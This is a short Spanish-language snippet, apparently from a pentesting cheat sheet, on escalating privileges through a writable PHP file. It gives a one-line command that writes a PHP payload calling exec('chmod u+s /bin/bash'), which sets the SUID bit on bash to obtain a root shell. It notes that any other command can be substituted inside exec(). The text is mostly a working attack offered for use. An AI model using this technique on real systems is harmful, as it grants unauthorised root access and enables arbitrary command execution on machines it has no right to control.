Si por ejemplo tenemos .php al que tenemos acceso, podemos hacer lo siguiente:

echo '<?php exec("chmod u+s /bin/bash"); ?>' > /carpeta/.php

En este caso, estamos cambiando los permisos de /bin/bash para que podamos ejecutarla nosotros como root. En caso de querer ejecutar otro código, bastaría con cambiar lo que esta entre comillas tras exec().